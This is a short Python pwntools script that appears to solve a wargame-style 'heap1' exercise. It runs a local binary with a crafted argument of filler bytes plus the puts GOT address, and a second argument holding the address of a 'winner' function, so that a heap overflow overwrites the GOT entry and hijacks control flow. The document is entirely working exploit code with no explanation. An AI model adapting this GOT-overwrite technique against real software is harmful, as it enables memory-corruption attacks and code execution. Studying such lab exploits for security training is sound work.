import pwn as p

puts_got_addr = p.p32(0x0804a018)
winner_addr = p.p32(0x080484b6)

target = p.process(['./heap1', 20*b"\x30"+puts_got_addr, winner_addr])
target.interactive()
